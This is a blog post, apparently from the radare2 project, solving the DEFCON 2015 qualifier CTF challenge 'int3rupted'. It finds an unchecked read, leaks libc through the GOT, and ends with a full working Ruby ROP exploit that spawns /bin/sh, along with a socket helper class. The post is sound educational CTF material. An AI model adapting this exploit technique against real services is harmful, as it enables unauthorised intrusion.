+++
date = "2015-06-04T21:43:59+02:00"
draft = false
title = "Solving 'int3rupted' from defcon 2015 qualifier with r2"
slug = "solving-int3rupted-from-defcon-2015-qualifier-with-r2"
aliases = [
	"solving-int3rupted-from-defcon-2015-qualifier-with-r2"
]
+++
In previous blog posts we've shown how radare2 can be useful for exploiting "baby" level challenges. Let's show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the [DEFCON 2015 qualifiers]( https://legitbs.net/ )!

You can find the binary [here]( https://github.com/ctfs/write-ups-2015/blob/master/defcon-qualifier-ctf-2015/pwnable/int3rupted/int3rupted_3bb8f10793b82841c44a366eb9f27223 ) if you want to play along at home.

To start with, in the challenge, we were just given a hostname and ip address, no binary was given! To simulate this, we can use `rarun2` to host the binary locally. The following line will run the binary on port 8888 on connections:
```
rarun2 program=./int3rupted_3bb8f10793b82841c44a366eb9f27223 listen=8888
```

So, let's try connection with `nc` to try to interact. After some spamming every character, we discover that if you type in `?` a help message is displayed.

```
impactsite ~/int3 » nc localhost 8888
> ?
Help menu:
        g - Begin execution
        db <addr> - Dump bytes at addr
        bp addr - Set breakpoint at addr
        c - Continue from breakpoint.
        ? - This text
>
```

So, now the name `int3rupted` makes sense! The `int3` instruction is defined for use by debuggers to temporarily replace an instruction in a running program in order to set a breakpoint. 

Because this is the binary is not provided, it's going to take some work to find the bug! As we have arbitrary read with `db <addr>` it will just take a bit of work to find the bug.

Checking through the loader script on Linux, amd64, we can see that the elf gets loaded at address `0x400000`, so you can start dumping from there.

```sh
impactsite ~ » cat /usr/lib/ldscripts/elf_x86_64.x | grep SEGMENT_START
  PROVIDE (__executable_start = SEGMENT_START("text-segment", 0x400000)); . = SEGMENT_START("text-segment", 0x400000) + SIZEOF_HEADERS;
  . = SEGMENT_START("ldata-segment", .);
```

![header](/blog/images/elf_header.png)

Although it is a tedious process, you can dump the enough of the binary to load it up in your favorite disassembler.

So, quickly after reversing (which I will leave as an exercise to the reader), a high level overview of the binary is as follows.

- `g` goes to chance game
 - high score lets you write your name into *.bss area*
- `db` dump bytes - we used to dump bin
- `bp` sets breakpoint, write `0xCC` mark page as `R-X` (not `W`!) can’t do this to stack, b/c becomes unwritable :(
- `c` restore from breakpoint
- `?` print help text

Let's look at how int3rupted reads in the user's input. The function takes in a length, a fd to read from, a buffer to write to, and a "stop" character (newline).

![read_user_input](/blog/images/disasm.png)

Oh, what's this?!? The "length" var is increased, but it's termination value is at `length == 0`. This means we have an _unchecked_ read.

Let's have a look at who else calls the `read_user_input` function.

![xrefs](/blog/images/pd2.png)

Can it really be so simple, just a basic stack smash from `main_menu`? There is no `system` called in the binary, and there is *ASLR* activated, but if you recall, we have an arbitrary read, so we can just leak the addresses of libc functions, simple! There isn't even a stack canary to worry about.

Let's use `rabin2` to find the address to read in order to leak the libc function `puts`.

![puts](/blog/images/rabin.png)

Let's just assume that it's on Ubuntu trusty, because all of the other challenges were. Otherwise there are some nice [database tools]( https://github.com/niklasb/libc-database ) to use.

So, from here, there is not much left to do. Just construct an exploit that does the following:

- leak libc address of puts
- compute offset of `/bin/sh\x00` and `system`
- `pop /bin/sh\x00` into `rdi`
- call `system`

Simple, right?

And like magic, we can get a shell! 5 easy points. The final exploit below has comments for the r2 commands to get the needed values (like rop gadgets and offsets).
![shell](/blog/images/shell.png)

```ruby
#!/usr/bin/env ruby
require_relative 'shoe'

# host = "int3rupted_3bb8f10793b82841c44a366eb9f27223.quals.shallweplayaga.me"
# port = 52428

# rarun2 program=./int3rupted_3bb8f10793b82841c44a366eb9f27223 listen=8888
host = "localhost"
port = 8888

# ubuntu trusty libc
system_offset = 0x00046640 # is~name=system - from libc
binsh_offset = 0x0017ccdb # / /bin/sh\x00 - from libc
puts_offset = 0x0006fe30 # is~name=puts - from libc
exit_offset = 0x0003c290 # is~name=exit - from libc
# from int3rupted binary
poprdirbpret = 0x00401648 # "/R/ pop rdi;ret"
puts_got = 0x00603028 # iR~puts

@s = Shoe.new host, port

def read_menu
  @s.read_til_end 0.1
end

@s.say "?\n"
read_menu
puts "[!] dumping GOT address of puts"
@s.say "db 0x#{puts_got.to_s 16}\n"
str = read_menu
puts str.split(">")[0]
libc_base_addr = (str.split("-")[0].split(":")[1].reverse.split(" ").map{|i| i.reverse}.join("").to_i 16) - puts_offset
puts "[+] libc base is at 0x#{libc_base_addr.to_s 16}"
puts "[+] system is at 0x#{(libc_base_addr + system_offset).to_s 16}"
puts "[+] /bin/sh\\x00 is at 0x#{(libc_base_addr + binsh_offset).to_s 16}"
@s.say ("g\n")
read_menu
rop = "A" * 56
rop << [poprdirbpret].pack("Q") # get /bin/sh into rdi
rop << [libc_base_addr + binsh_offset].pack("Q") # /bin/sh into rdi
rop << "JUNKJUNK" # garbage popped into rbp
rop << [libc_base_addr + system_offset].pack("Q") # system("/bin/sh")
rop << [libc_base_addr + exit_offset].pack("Q") # exit cleanly :)
puts "[!] sending rop chain!"
@s.say "#{rop}\n"
str = read_menu
puts "[*] enjoy your shell"
@s.tie!
```
```ruby
require 'socket'
require 'timeout'
require 'rolling_timeout'

class Shoe < TCPSocket
  def recv_until str
    buf = ""
    until buf.end_with? str do
      buf << self.recv(1)
    end
    buf
  end

  def recv_until_re regex
    buf = ""
    while not regex.match buf
      buf << self.recv(1)
    end
    buf
  end

  def say str
    self.send str, 0
  end

  def read_n_seconds secs
    # requires native threads.
    # doesn't work with ruby 1.8.x or lower
    buf = ""
    begin
      timeout(secs) do
        loop {
          buf << self.recv(1)
        }
      end
    rescue Timeout::Error
    end
    buf
  end

  def read_til_end timeout
    # timeout is time between chars
    buf = ""
    begin
      RollingTimeout.new(timeout) { |timer|
        loop {
          buf << self.recv(1)
          timer.reset
        }
      }
    rescue Timeout::Error
    end
    buf
  end

  def tie!
    # kick off a thread just reading forever
    Thread.new { loop { $stdout.write(self.recv(4096)) } }
    str = ""
    loop {
      ch = $stdin.read_nonblock(1) rescue nil
      if ch == nil
        next
      end
      self.send ch, 0
    }
  end
end
```
